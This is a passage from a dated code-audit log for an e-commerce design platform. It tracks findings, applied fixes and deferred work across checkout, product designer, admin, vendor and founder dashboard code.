- ✅ Added image fallback + `onError` to `src/pages/Cart.tsx:60-67`. No more broken-image icon when a product has no images.

### Deferred (carry forward)
- Persist cart to localStorage (subscribe to `state` in `CartContext` and `localStorage.setItem`).
- Move tax rate to a backend config (or per-state lookup); replace `* 0.08` literals.
- De-duplicate free-shipping threshold between `Cart.tsx` and `shippingCalculator`.
- Resolve `/api/wallet/process-itc-payment` 404 — either add a backend route or remove the frontend call at `Checkout.tsx:474-503`.
- Lazy-load Stripe at checkout-route mount.
- Debounce `calculateShipping` (300ms) on address fields.
- Inventory check before order creation.
- Verify Stripe raw-body mount order in `backend/index.ts`.

### Verdict
The endpoint mismatch on `/api/wallet/process-itc-payment` is the highest-priority unfixed item — it's been flagged in two prior cycles (2026-03-13 and 2026-03-22) and represents a silently-failing payment path. One small fix shipped this cycle (cart image fallback). The structural issues (cart persistence, tax config, Stripe lazy-load) all need product/architecture decisions before code changes are safe.

### Re-audit 2026-04-29

**What changed since 2026-04-28:** No checkout-flow code touched between cycles. Stripe webhook mount order verified by reading `backend/index.ts:131-134` — `express.raw('/api/stripe/webhook')` is correctly registered BEFORE `express.json()`, so signature verification stays intact. The `/api/wallet/process-itc-payment` 404 path was *already* safe-failed in a prior cycle (the broken `apiFetch` call was replaced with a `setPaymentError` that gives a clear "Mixed-cart ITC checkout is not currently available" message + a `console.warn` for ops). The prior audit summary undersold that fix — reclassifying.

**Status of prior findings:**
- 🔴 → 🟢 **Cart not persisted to localStorage** — `CartContext.tsx` now persists `items` and `appliedCoupon` to versioned localStorage keys (`itp_cart_v1`, `itp_cart_coupon_v1`), with a lazy `useReducer`/`useState` initializer that reads on mount and a `useEffect` that writes on every change. Recompute total on hydration so a stale serialized total can't disagree with the current pricing rules. Try/catch wraps both for Safari private-mode/quota errors. *(Fix applied this cycle.)*
- 🔴 **Tax hardcoded 8%** — Still in `Cart.tsx:142` and `Checkout.tsx:318`. Defer (real fix is admin-configurable rate table, possibly per-state).
- 🟡 **Free-shipping $50 duplicated between `Cart.tsx` and `shippingCalculator`** — Unchanged. Defer (extract to shared constant).
- 🔴 → 🟢 **`/api/wallet/process-itc-payment` 404 silent fail** — Reclassified. Code path is unreachable today (no cart item ever sets `paymentMethod: 'itc'`) and the handler was already converted to surface a clear `setPaymentError` message instead of issuing the dead fetch. Backend route still doesn't exist, but neither does the call. Defer the dead-handler removal pending a product call on whether mixed-cart ITC will ever ship.
- ⚡ → 🟢 **Shipping recalculates on every keystroke** — `Checkout.tsx:328-339` now wraps `calculateShipping()` in a 350ms debounce (`setTimeout`/`clearTimeout` cleanup pattern). Address typing no longer fans out to the Google Distance Matrix API per character. *(Fix applied this cycle.)*
- ⚡ **Stripe loaded at module level** — `Checkout.tsx:13`'s `loadStripe()` still runs on import. Looking again: the Stripe SDK internally caches the promise so multiple calls return the same instance, and the module-eval cost is bound by the lazy-route chunking introduced in cycle #26 — `Checkout` is now a `React.lazy()` chunk, so `loadStripe` doesn't run until the user actually navigates to `/checkout`. Reclassifying as 🟢: the practical concern from the original audit is already addressed by route splitting. Defer formal `useMemo` wrap.
- ⚡ **Stripe webhook raw-body mount order** — Verified `backend/index.ts:131-134`: `express.raw()` at line 132 is correctly mounted BEFORE `express.json()` at line 134. No fix needed. Reclassifying to 🟢.
- 🟡 **No inventory check at checkout** — Unchanged. Defer (needs row-lock + transaction; mid-size refactor).

**New findings:**
- 🟡 **Console.log noise in checkout** — `Checkout.tsx:266` (`'[checkout] Loaded draft order: …'`) and `Checkout.tsx:396` (`'[checkout] createPaymentIntent called', {…}`) leak in production. Less spammy than the wizard polling loop fixed in cycle #28 but worth a follow-up `debugLog` migration. Defer.
- 🟢 **Coupon-apply button correctly disabled during loading** — Confirmed at `Checkout.tsx:1356`.

### Fixes Applied (re-audit)
- ✅ `src/context/CartContext.tsx:1, 10-43, 153-198` — Added versioned localStorage persistence for cart items + applied coupon. Lazy initializers on mount; effect-driven writes on change; try/catch to absorb private-mode and quota errors. Recomputes `total` on hydration so the serialized total can never lie about today's pricing.
- ✅ `src/pages/Checkout.tsx:328-339` — 350ms debounce on `calculateShipping` so address typing no longer triggers per-keystroke Distance Matrix API calls.

### Deferred (re-audit)
- Move tax rate to backend config (per-state lookup) and replace `* 0.08` literals.
- Extract free-shipping threshold to a shared constant used by both `Cart.tsx` and `shippingCalculator`.
- Decide fate of mixed-cart ITC: either wire a `/process-itc-payment` route or remove the `handleITCPayment` dead handler.
- Inventory check before order creation (Stripe + ITC paths).
- Migrate the two `Checkout.tsx` console.logs to a `debugLog` helper similar to cycle #28's wizard fix.
- Optional: formal `useMemo` wrap around `loadStripe(...)` if a future change moves the `Checkout` import out of the lazy chunk.

---

## Product Design & Customization — Re-audit (2026-04-28)

**What was checked:** Status of the 13 findings from 2026-03-13 + scan for new bugs in `ImaginationStation.tsx`, `ImaginationStationEnhanced.tsx`, `ProductDesigner.tsx`, all `src/components/imagination/*`, `DesignHistorySidebar.tsx`, `DesignStudioModal.tsx`, `MrImagineModal.tsx`.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — LeftSidebar TODO handlers** — `src/components/imagination/LeftSidebar.tsx:94-102`. `handleMrImagine` and `handleITPEnhance` still `console.log`-only. Buttons wired but inert.
  - **Deferred:** Open the existing `MrImagineModal`/`ITPEnhanceModal` from these handlers (or remove the buttons).
- 🟡 **PARTIAL — `ImaginationStationEnhanced` redundant** — File trimmed from ~110 → 84 lines and now only wraps `ImaginationStation` in `ImaginationErrorBoundary`. Harmless, but still a redirect layer.
  - **Deferred:** Inline the `ImaginationErrorBoundary` directly into the route in `App.tsx` and delete the wrapper.
- 🔴 **STILL OPEN — `ProductDesigner.tsx` is 1,609 dead lines** — Verified 0 imports across `src/`. Routes redirect `/designer` → `/imagination-station`.
  - **Deferred:** Delete the file and the `/designer` redirect once route map is reviewed (large change to bundle).
- 🟡 **STILL OPEN — `ITCBalance` hardcoded prices** — `src/components/imagination/ITCBalance.tsx:71,75`. Still says "5 ITC" / "3 ITC" instead of pulling from a pricing source.
  - **Deferred:** Wire to `pricing` prop or a shared constants file.
- 🟢 **`layer_type` string-check sprawl** — Grep finds zero current matches in `ImaginationStation.tsx`. Either refactored away or moved to a helper without us noticing.
- 🟡 **STILL OPEN — Two sheet size selectors** — Not the cycle's focus; defer.
- 🟡 **STILL OPEN — Blank canvas with no CTA** — Defer.
- 🟡 **STILL OPEN — DPI warnings not surfaced per-image** — Defer.
- 🟡 **STILL OPEN — "Insufficient ITC" not actionable** — `MrImagineModal.tsx:207` still text-only.
- ⚡ **STILL OPEN — `SheetCanvas` not memoized** — `src/components/imagination/SheetCanvas.tsx:866` plain `export default`. Wrapping in `React.memo` is risky for Konva-backed components (props identity vs imperative refs); defer with intent.
- ⚡ **WAS OPEN — Sequential file upload (also a real bug)** — `LeftSidebar.tsx:55-92`. The original for-loop kicked off async `FileReader`s, but `setIsProcessing(false)` ran in `finally` *synchronously* before any reader fired, so the spinner was off the whole time and an upload error couldn't be surfaced.
  - **Fix applied:** Wrapped each read in a `Promise<void>` and awaited `Promise.all()`. Now `setIsProcessing(false)` runs after all readers resolve. Errors on `reader.onerror` / `img.onerror` resolve safely so one bad file doesn't hang the batch.
  - File: `src/components/imagination/LeftSidebar.tsx:52-92`
- ⚡ **STILL OPEN — No pagination in `DesignHistorySidebar`** — `src/components/DesignHistorySidebar.tsx:47-63` still fetches all sessions.
  - **Deferred:** Add cursor pagination once a user actually has 100+ designs.
- ⚡ **PARTIAL — Konva inline handler cleanup** — `SheetCanvas.tsx:502` has window resize cleanup; per-node onDragEnd/onTransformEnd are reconciled by react-konva. Acceptable.

### New issues found
- 🟡 **WAS OPEN — `MrImagineModal.handleDownload` URL leak** — `src/components/imagination/MrImagineModal.tsx:264-281`. `URL.createObjectURL(blob)` was created at line 270 and revoked at 277, but if anything between (DOM `appendChild`/`click`/`removeChild`) threw, revoke was skipped. Tiny but real leak, accumulates if a user retries downloads on a flaky page.
  - **Fix applied:** Moved revoke into a `finally` block; `url` declared outside `try`.
  - File: `src/components/imagination/MrImagineModal.tsx:263-282`
- 🟡 **`MrImagineModal` re-render churn from un-memoized callbacks** — `onImageGenerated` is invoked at `MrImagineModal.tsx:251` without `useCallback`, causing parent re-renders to recreate the prop and re-trigger child effects.
  - **Deferred:** Wrap `onImageGenerated` in `useCallback` at the parent (likely `RightSidebar` or `ImaginationStation`).

### Fixes Applied
- ✅ `LeftSidebar` file upload now uses `Promise.all` so the processing state actually tracks completion (was a real spinner-state bug masked as a perf win).
- ✅ `MrImagineModal` download leak: `URL.revokeObjectURL` now runs in `finally`.

### Deferred (carry forward)
- Wire `LeftSidebar` Mr.Imagine + ITP-Enhance buttons to their respective modals (or remove).
- Inline `ImaginationErrorBoundary` into the route and delete `ImaginationStationEnhanced.tsx`.
- Delete `ProductDesigner.tsx` (1,609 lines) and the `/designer` redirect after a route-map review.
- `ITCBalance.tsx` hardcoded prices → centralize.
- Two sheet-size selectors → pick one source of truth.
- Blank-canvas CTA, DPI per-image warnings, "Insufficient ITC → Add ITC" CTA.
- `React.memo(SheetCanvas)` (verify Konva prop equality first).
- Pagination for `DesignHistorySidebar` once needed.
- `useCallback` on `MrImagineModal` parent callbacks.

### Verdict
Two real fixes shipped — one of them was misclassified as a perf issue last cycle but is actually a state-management bug (loading spinner exited before any file read began) that's been silently broken since 2026-03-13. The other is a small `URL.revokeObjectURL` leak. All the bigger structural debt (1,609-line dead file, redundant wrapper page, TODO handlers) needs deletes/route changes that the audit cycle has appropriately deferred for a focused dead-code pass.

### Re-audit 2026-04-29

**What changed since 2026-04-28:** No imagination tree code touched between cycles. `MrImagineModal` `URL.revokeObjectURL` leak fix and `LeftSidebar` `Promise.all` upload fix from cycle #4 still in place. `MrImagineModal` parent callbacks (`onImageGenerated`) ARE properly `useCallback`-wrapped at `RightSidebar.tsx:100` (`handleAddAIImage`) — the prior audit's "deferred" item was already fine and got reclassified.

**Status of prior findings:**
- 🔴 → 🟢 **`ProductDesigner.tsx` 1,609 dead lines** — Final verification: zero imports across `src/` (only self-references and a doc-example mention in `MockupPreview.test.md`). `App.tsx:148` redirects `/designer` → `/imagination-station`. Deleted. *(Fix applied this cycle.)*
- 🟡 → 🟢 **`ImaginationStationEnhanced.tsx` redundant wrapper** — Confirmed no longer routed (`App.tsx` uses `ImaginationStation` directly inside `ImaginationErrorBoundary`). Zero imports. Deleted (83 lines). *(Fix applied this cycle.)*
- 🔴 **LeftSidebar TODO handlers** — `handleMrImagine`/`handleITPEnhance` at lines ~100-108 still `console.log`-only. Defer (needs UX spec on which modal to open and how to plumb pricing).
- 🔴 **`ITCBalance` hardcoded "5 ITC"/"3 ITC"** — Component currently only takes `balance: number`, doesn't take a pricing prop at all (the prior audit's "ignores it" claim was wrong; the prop never existed). Real fix needs plumbing `ImaginationPricing[]` from `ImaginationStation` → `LeftSidebar` → `ITCBalance`. Defer.
- ⚡ **`SheetCanvas` not memoized** — Still plain `export default`. Konva-backed components have tricky prop equality (refs vs values). Defer with intent — `React.memo(SheetCanvas, customCompare)` needs the audit to be sure props don't include unstable closures from `react-konva`.
- ⚡ **`DesignHistorySidebar` no pagination** — Still fetches all sessions. Defer until a user has 100+ designs (no production complaint yet).
- 🟢 **`MrImagineModal` `onImageGenerated`** — Reclassifying. `RightSidebar.tsx:100` already wraps the parent callback in `useCallback`, so the un-memoized churn the prior audit feared isn't there.
- 🟢 **Other 2026-03-13 findings** — Two sheet-size selectors / blank canvas CTA / DPI per-image / "Insufficient ITC → Add ITC" CTA — all unchanged. Defer batch as UX-design work.

**New findings:**
- 🟢 **No new TODOs/FIXMEs** in `src/components/imagination/` since 2026-04-28 (still just the 2 LeftSidebar TODOs).
- 🟢 **No new console.log noise** — Only the 2 LeftSidebar placeholder logs. Production-clean.

### Fixes Applied (re-audit)
- ✅ Deleted `src/pages/ProductDesigner.tsx` (1,609 lines, dead since `/designer` → `/imagination-station` redirect was added; zero imports verified, flagged 3+ cycles).
- ✅ Deleted `src/pages/ImaginationStationEnhanced.tsx` (83 lines, wrapper around `ImaginationStation` that was never routed; flagged 2+ cycles). Build verified clean (`npx vite build` succeeds; no chunk dropped from manifest).

### Deferred (re-audit)
- Wire `LeftSidebar` Mr.Imagine + ITP-Enhance buttons (or remove) — needs UX spec.
- Plumb feature costs (`ImaginationPricing[]` from imagination-pricing service) into `ITCBalance` so "5 ITC"/"3 ITC" labels stay in sync with admin-configurable rates.
- `React.memo(SheetCanvas)` with a custom comparator that doesn't choke on Konva refs.
- Pagination for `DesignHistorySidebar` once a real user crosses 100 sessions.
- All UX-spec items: sheet-size selector consolidation, blank-canvas CTA, per-image DPI warnings, "Insufficient ITC → Add ITC" actionable CTA.

---

## Admin Dashboard — Re-audit (2026-04-28)

**What was checked:** Status of the three findings from 2026-03-13 + scan for new admin-side bugs (alert/toast carryover, missing confirmations, direct Supabase mutations from frontend, route protection drift).

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — `/api/ai/voice/settings` still 404** — Verified by grep. `backend/routes/ai/voice.ts` only registers `/synthesize` (POST) and `/voices` (GET); no `/settings` route anywhere in `backend/`. Frontend `src/pages/admin/VoiceSettings.tsx:15,27` still calls the missing endpoint.
  - **Deferred:** Adding the route is straightforward but needs schema decisions (which voice settings to persist, whether per-tenant or global, table name). Carryover.
- 🟡 **STILL OPEN — `AdminPanel` vs `AdminControlPanel` naming** — Both files unchanged since prior cycle. `AdminPanel.tsx` (~566 lines, DB browser) and `AdminControlPanel.tsx` (~574 lines, platform settings) both linked from admin nav with similar names.
  - **Deferred:** Rename one (e.g. `AdminPanel` → `AdminDataExplorer`) and update the nav link.
- 🟡 **PARTIAL — Missing confirmations on destructive admin actions** —
  - `toggleFeatured()` at `AdminDashboard.tsx:612` — no confirm. Soft, reversible action; acceptable without prompt.
  - `handleRegenerateImages()` at `AdminDashboard.tsx:738` — **had** no confirm; now gated by `confirm('Regenerate images for this product? This consumes AI credits.')`.
  - `handleRemoveBackground()` at `AdminDashboard.tsx:752` — **had** no confirm; now gated by `confirm('Run background removal on this product? This consumes AI credits.')`.
  - `handleDeleteProduct()` at `AdminDashboard.tsx:706-736` — already had `confirm()` (good).

### New issues found
- 🟡 **`alert()` carryover from cycle #27** — `AdminDashboard.tsx` still has dozens of `alert()` calls (e.g. lines 627, 702, 734, 742, 746, 756, 760). Cycle #27 (2026-04-27) explicitly deferred the migration to `useToast()`. Re-flagged as the largest UX cleanup remaining.
  - **Deferred:** Batch find/replace `alert()` → `toast.error()`/`toast.success()` then manual review. ~38 calls in this file alone.
- 🟡 **Frontend mutates Supabase directly** — `AdminDashboard.tsx:615-618` (toggle featured), `:711-718` (delete product), and similar locations issue `supabase.from('products').update/delete()` straight from the browser. Relies entirely on RLS for safety; no audit log on the server, no rate limit. The local `auditLogs` array (line 688-699) is in-memory only.
  - **Deferred:** Move to backend admin endpoints with `requireRole(['admin'])` + write to a real `audit_logs` table.
- 🟡 **Local audit log array is theater** — `AdminDashboard.tsx:688-699,720-731`. `auditLogs` state is never persisted; it lives until the page reloads. Looks like a real audit trail, isn't.
  - **Deferred:** Remove or wire to backend.
- 🟢 **Other admin component patterns are healthy** — `AdminEmailTemplates`, `AdminInvoiceManagement`, `AdminControlPanel`, `AdminGiftCardManagement` all use `Promise.all()` and are properly auth-gated.

### Fixes Applied
- ✅ `handleRegenerateImages` and `handleRemoveBackground` in `AdminDashboard.tsx` now require `confirm()` before consuming AI credits.
  - File: `src/pages/AdminDashboard.tsx:738-764`

### Deferred (carry forward)
- Add `/api/ai/voice/settings` GET/POST routes (with `requireAuth` + `requireRole(['admin'])`). Decide on table/scope first.
- Rename one of `AdminPanel` / `AdminControlPanel` to remove naming overlap.
- Migrate `AdminDashboard.tsx` `alert()` calls to `useToast()` (carryover from #27).
- Replace direct `supabase.from('products').update/delete()` with a backend admin endpoint that writes a real audit row.
- Delete or persist the in-memory `auditLogs` array — currently misleading.

### Verdict
Two AI-job triggers (regenerate images, remove background) now require confirmation — minor but blocks an entire class of "miss-click costs $X" mistakes. The biggest unaddressed item remains the missing `/api/ai/voice/settings` endpoint (still 404 since 2026-03-13), and the carryover of `alert()` migration from cycle #27. Auth and Promise.all hygiene across admin components is still good.

### Re-audit 2026-04-29

**What changed since 2026-04-28:** No `AdminDashboard` code touched between cycles. `/api/ai/voice/settings` still 404 from frontend `admin/VoiceSettings.tsx`. `AdminDashboard.tsx` still had the full 45 raw `alert()` calls — flagged in cycles #27, #28, and prior #5. `useToast` was never wired into this file. `auditLogs` in-memory theater still present.

**Status of prior findings:**
- 🟡 → 🟢 **`AdminDashboard.tsx` `alert()` carryover** — Wired `useToast()` at the component top. Migrated *all* 45 `alert()` calls to the toast system in a single batch: error paths to `toast.error(title, error.message)`, success paths to `toast.success(title, detail)` (with proper singular/plural handling for bulk-delete/publish), validation prompts to `toast.warning(title, detail)`. 0 raw `alert()` calls remain in the file (verified by grep). *(Fix applied this cycle.)*
- 🔴 **`/api/ai/voice/settings` still 404** — Unchanged. Defer (needs schema decisions: tenant scope, table name, persistence strategy).
- 🟡 **`AdminPanel` vs `AdminControlPanel` naming overlap** — Unchanged. Defer (cosmetic rename + nav update).
- 🟡 **Frontend mutates Supabase directly** — Unchanged. The newly-migrated bulk-delete/publish toasts still wrap direct `supabase.from('products').update/delete()` calls. Defer (real fix is server-side admin endpoints + `audit_logs` rows).
- 🟡 **`auditLogs` in-memory theater** — Unchanged. The local `setAuditLogs(prev => [auditLog, ...prev])` calls now sit alongside server-side `supabase.from('audit_logs').insert()` calls (which DO persist). The local state appears to be display-cache only. Defer cleanup (need to confirm UI doesn't depend on the local state for mid-session display).

**New findings:**
- 🟢 **No new admin endpoints added unguarded** — Verified the recent `aiProducts`/`adminApi` calls all flow through routers that have `requireAuth + requireRole(['admin'])` middleware (cycle #1 added shared role caching; same gate applies).
- 🟡 **Plural strings simplified during migration** — Bulk delete/publish messages now say "Successfully deleted N product(s)" with proper singular/plural switch instead of always-plural. Tiny UX polish but worth noting.

### Fixes Applied (re-audit)
- ✅ `src/pages/AdminDashboard.tsx:1-7` — Added `useToast` import.
- ✅ `src/pages/AdminDashboard.tsx:21-23` — Wired `const toast = useToast()` into the component.
- ✅ `src/pages/AdminDashboard.tsx` (45 sites) — Migrated all `alert()` calls to `toast.error` / `toast.success` / `toast.warning` with title/detail split. Sites touched: GPT assist (235), AI suggest (332-371), ITC pricing update/promo/reset (534-562), feature toggle (634), product save/delete/regenerate/remove-bg/mockups (711, 743, 750-756, 765-771, 856), bulk delete/publish (933-1018), upscale (1046-1056), product update/image delete/main image/promo (1139, 1219, 1279, 1299), role update/ITC grant (1470-1521), vendor product approve/reject (1550-1585), 3D model approve/reject (1614-1649), inline product delete (2230). Type-check clean.

### Deferred (re-audit)
- Add `/api/ai/voice/settings` GET/POST routes (still needs schema decisions).
- Rename `AdminPanel` → `AdminDataExplorer` (or similar) and update nav link.
- Move direct `supabase.from('products').update/delete()` calls to backend admin endpoints + write real `audit_logs` rows.
- Decide fate of in-memory `auditLogs` state (delete or wire to backend).
- Audit other admin components for stray `alert()`/`confirm()` patterns now that the dashboard is clean (`AdminCreateProductWizard`, `AdminGiftCardManagement`, etc. — most already use toasts but worth a sweep).

---

## Vendor Dashboard & Storefront — Re-audit (2026-04-28)

**What was checked:** Status of the 12 findings from 2026-03-13 + scan for new bugs in `VendorDashboard.tsx`, `VendorStorefront.tsx`, `VendorStorefrontManager.tsx`, `VendorDirectory.tsx`, `VendorMessages.tsx`, `VendorPayouts.tsx`, `vendor-payouts.ts`, `vendor-analytics.ts`.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — Mock analytics in `VendorDashboard`** — `VendorDashboard.tsx:27-32` still has hardcoded `totalSales: 542.30`, `thisMonth: 123.45`. No DB query.
- 🔴 **STILL OPEN — Product submit doesn't persist** — `VendorDashboard.tsx:128-164` `handleSubmitProduct()` still mutates local state only. No `supabase`/`fetch` call.
- 🔴 **STILL OPEN — Storefront URL availability is fake** — `VendorStorefrontManager.tsx:197-201` `checkUrlAvailability()` checks a hardcoded array. No DB query.
- 🟡 **WAS PARTIAL — Duplicate interface definitions** — `types/index.ts:543-583` is the canonical home for `VendorStorefrontTheme` and `VendorStorefrontConfig`. Both `VendorStorefront.tsx:9-49` and `VendorStorefrontManager.tsx:6-46` redeclared them byte-for-byte.
  - **Fix applied:** Deleted both local declarations. Both files now import the shared types. Future schema changes only need to happen once.
  - Files: `src/pages/VendorStorefront.tsx:1-10`, `src/pages/VendorStorefrontManager.tsx:1-8`
- 🟡 **STILL OPEN — `VendorDirectory` wholesale-only gate** — `VendorDirectory.tsx:237` blocks non-wholesale roles. Likely intentional product behavior; flagging for product review, not auto-fixable.
- 🟡 **STILL OPEN — Three product management interfaces** — VendorDashboard Products tab, Submit tab, and `VendorStorefrontManager` still all manage products.
  - **Deferred:** Pick a canonical surface, redirect the others.
- 🟡 **STILL OPEN — Dead "Request Quote" button** — `VendorStorefront.tsx:680-682`. No `onClick`. A `ContactModal` component lives nearby (line 690+) and is the obvious target, but rewiring without product confirmation could change UX expectations.
  - **Deferred:** Wire to `ContactModal` or remove. Needs product input.
- 🟡 **STILL OPEN — Generic empty state** — Acceptable, low priority.
- 🟡 **STILL OPEN — Payout timestamps** — Defer with Founders dashboard work.
- ⚡ **STILL OPEN — Catalog tab reload-on-switch** — `VendorDashboard.tsx:69-73` no caching.
- ⚡ **STILL OPEN — VendorDirectory filter not memoized** — No `useMemo` around the filter pipeline.
- ⚡ **STILL OPEN — No pagination on vendor lists** — Renders full filtered list.

### New issues found
- 🟡 **TOCTOU on storefront URL reservation** — `VendorStorefrontManager.tsx`. Even if `checkUrlAvailability()` is wired to a DB query later, the gap between the check and the save lets two vendors race for the same URL.
  - **Deferred:** Need a unique constraint on `vendor_storefronts.custom_url` + handle 23505 conflict on insert (server-side). Belongs in the same backend pass that turns mock URL-validation into real validation.
- 🟡 **Hardcoded theme colors in `VendorStorefrontManager`** — `VendorStorefrontManager.tsx:118-120` defaults `#8B5CF6`, `#06B6D4`, `#F8FAFC`. Vendor-facing storefronts intentionally have their own palette (not the platform theme), so these colors are meant to be configurable defaults — not a bug, just worth noting they're not in a shared `defaults` constant.
  - **Deferred:** Move to `src/constants/storefront-defaults.ts` if this gets duplicated elsewhere.
- 🟢 **Vendor payout math still verified correct** — `vendor-payouts.ts:32-51`. Platform 7% + Stripe 3.5% = 10.5%, math holds.

### Fixes Applied
- ✅ Removed duplicate `VendorStorefrontTheme` / `VendorStorefrontConfig` interface declarations from `VendorStorefront.tsx` and `VendorStorefrontManager.tsx`. Both now import from `src/types/index.ts`. Compile clean (`API:200 Web:200` post-edit).

### Deferred (carry forward)
- Replace `VendorDashboard` mock analytics with real Supabase query against `orders` + `vendor_products`.
- Persist product submissions in `handleSubmitProduct` (or remove the form if vendors should use `AdminCreateProductWizard` exclusively).
- Real DB-backed URL availability check + unique constraint + 23505 handling.
- Pick one canonical product-management surface and remove the other two.
- Wire or remove the dead "Request Quote" button in `VendorStorefront.tsx:680`.
- Cache vendor catalog data; memoize `VendorDirectory` filter; paginate vendor list.
- `VendorPayouts` payout timestamps when payout flow is reworked.
- Confirm `VendorDirectory` wholesale-only gate is intentional with product team.

### Verdict
Vendor area is still ~40% mock implementations — three of the four 2026-03-13 🔴 findings (mock dashboard data, non-persisting product submit, fake URL check) need backend work that is out of scope for the audit cycle. The duplicate interfaces are now consolidated under `src/types`, removing one foot-gun for future schema changes. Everything else is documented and queued.

### Re-audit 2026-04-29

**What changed since 2026-04-28:** No vendor-area code touched between cycles. All three 🔴 mock-data items still open (analytics 542.30/123.45, non-persisting product submit, hardcoded URL availability). The "Request Quote" button in `VendorStorefront`'s child `ProductCard` component still inert despite a fully-built `ContactModal` sitting in the same file. `VendorDirectory` filter pipeline still ran via a `useEffect → setFilteredVendors` round-trip per state change.

**Status of prior findings:**
- 🔴 → 🟢 **"Request Quote" button** — Wired the inner `ProductCard.tsx`'s button to the existing `setIsContactModalOpen(true)` state owned by the parent `VendorStorefront`. Added an `onRequestQuote` prop to `ProductCard` and threaded `() => setIsContactModalOpen(true)` from the `.map()` render at the parent. ContactModal already mounts conditionally on `isContactModalOpen`. *(Fix applied this cycle.)*
- ⚡ → 🟢 **`VendorDirectory` filter not memoized** — Replaced the `useEffect → setFilteredVendors` pattern with a `useMemo` keyed on `[vendors, selectedFilters, searchQuery]`. Removed the `filteredVendors` state since useMemo returns the value directly — saves a render cycle per filter change. Also fixed a latent bug: the prior `filtered.sort(...)` mutated `filtered` in place; the new code uses `[...filtered].sort(...)` so the source array is never mutated. *(Fix applied this cycle.)*
- ⚡ → 🟢 **Vendor product card images** — `VendorStorefront.tsx` `ProductCard` `<img>` now has `loading="lazy"` and `decoding="async"` so off-screen vendor catalog cards don't all eager-load on page mount. *(Fix applied this cycle.)*
- 🔴 **Mock analytics in `VendorDashboard`** — Still hardcoded. Defer (needs backend `orders` + `vendor_products` rollup query).
- 🔴 **`handleSubmitProduct` doesn't persist** — Still local-state only. Defer.
- 🔴 **`checkUrlAvailability` hardcoded array** — Still a tiny in-memory blocklist. Defer (needs DB query + unique index + 23505 conflict handling).
- 🔴 **Three product management interfaces** — Unchanged. Defer.
- 🔴 **CreatorAnalytics mounted under vendor tab** — Unchanged. Defer (conceptual scope decision).
- 🟡 **Theme color defaults hardcoded** — Unchanged. Defer (single-component, low duplication risk for now).
- 🟡 **9 raw `alert()` calls across vendor pages** (`VendorDashboard.tsx:124,163`, `VendorStorefrontManager.tsx:144,147`, `VendorMessages.tsx:87,144`, `VendorPayouts.tsx:58,61,78`) — Defer (same migration pattern as cycle #5's 45-call AdminDashboard sweep; would be the next batch).
- 🟢 **Vendor payout math** — Re-verified `vendor-payouts.ts:32-51`: 7% platform + 3.5% Stripe = 10.5%. Math holds.

**New findings:**
- 🟡 **Latent in-place sort bug in old `filterVendors`** — The pre-fix code did `filtered.sort(...)` then `setFilteredVendors(filtered)`. Because `filtered = vendors` aliased the source array when no filter was applied, the source could be mutated by sort. Not visible because `vendors` was reset on every load, but worth noting as an "almost-bug" caught during the useMemo refactor. Fixed as part of the same change.
- 🟢 **`vendor-payouts.ts` math** — Reconfirmed correct.

### Fixes Applied (re-audit)
- ✅ `src/pages/VendorStorefront.tsx:540-549, 586-593, 644-649` — Threaded `onRequestQuote` prop from parent `VendorStorefront` into `ProductCard`; wired the inert Request Quote button to open the existing `ContactModal`.
- ✅ `src/pages/VendorStorefront.tsx:599-606` — Added `loading="lazy"` and `decoding="async"` to vendor `ProductCard` `<img>`.
- ✅ `src/pages/VendorDirectory.tsx:1, 9-12, 22-26, 168-228` — Imported `useMemo`; deleted the `filteredVendors` state + `useEffect → filterVendors` round trip; rewrote `filterVendors` as a `useMemo` keyed on `[vendors, selectedFilters, searchQuery]`. Sort now uses `[...filtered].sort(...)` to avoid mutating the source array.

### Deferred (re-audit)
- Backend-backed `VendorDashboard` analytics (`orders` + `vendor_products` rollup).
- Persist `handleSubmitProduct` (or remove if vendors are meant to use `AdminCreateProductWizard`).
- Real `checkUrlAvailability` + unique index + 23505 race handling.
- Pick a canonical product-management surface (Dashboard Products tab vs Submit tab vs `VendorStorefrontManager`) and remove the others.
- Decide intent of `CreatorAnalytics` under vendor tab.
- Migrate 9 vendor-page `alert()` calls to `useToast()` (next batch after cycle #5).
- Move theme defaults to `src/constants/vendor-theme.ts` if/when they're duplicated elsewhere.

---

## Founder Dashboard & Earnings — Re-audit (2026-04-28)

**What was checked:** Status of the 10 findings from 2026-03-13 + scan for new bugs in `FoundersDashboard.tsx`, `FounderEarnings.tsx`, `CreatorAnalytics.tsx`, `founder-earnings.ts`, `backend/routes/invoices.ts`.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — `founder-earnings.ts` is mock data** — `src/utils/founder-earnings.ts:149-190,238-280,305-346,418-426`. Zero `await supabase` / `await fetch` calls in the listed methods. `getFounderEarnings()`, `generateEarningsReport()`, `getProductCOGS()`, `getEarningsAnalytics()` all hardcoded.
- 🔴 **STILL OPEN — DB writes are no-ops** — `founder-earnings.ts:354-362,488-491`. `updateProductCOGS()` and `saveFounderEarnings()` only `console.log`.
- 🔴 **STILL OPEN — Two disconnected earnings systems** — `FoundersDashboard` reads `/api/invoices` (real, backend-backed). `FounderEarnings` reads `founderEarningsService` (mock). No bridge code added since 2026-03-13.
- 🟡 **STILL OPEN — Routes overlap** — `/founders`, `/founder/dashboard`, `/founder/earnings`. Backend has `/founders/list` for admin discovery.
- 🟡 **STILL OPEN — `CreatorAnalytics` mounted in `VendorDashboard`** — `VendorDashboard.tsx:11,576-578`. Creator and vendor concepts still mixed.
- 🟡 **STILL OPEN — No empty state in FounderEarnings** — Mock data masks the 0-earnings case.
- 🟡 **STILL OPEN — Errors hidden** — `FounderEarnings.tsx:66-68,84-86,106-108` only `console.error`.
- 🟡 **STILL OPEN — `alert()`/`prompt()` for COGS edit** — `FounderEarnings.tsx:547`. Carryover from #27 alert→toast migration.
- ⚡ **STILL OPEN — All data loaded on mount** — `FounderEarnings.tsx:51-60` `Promise.all` runs regardless of which tab user opens.
- ⚡ **STILL OPEN — No pagination on earnings table** — `FounderEarnings.tsx:440-471`.

### New issues found
- 🟡 **`FOUNDER_PERCENTAGE` duplicated across frontend/backend** — `backend/routes/invoices.ts:15` (`= 35`, used as `Math.floor(cents * 35/100)`) and `src/utils/founder-earnings.ts:60` (`= 0.35`, used as `grossProfit * 0.35`). Both functionally equal today but easy to drift. Verified: backend handles money in cents (correct); frontend uses floats on dollar amounts (the same imprecision risk as the rest of the mock service).
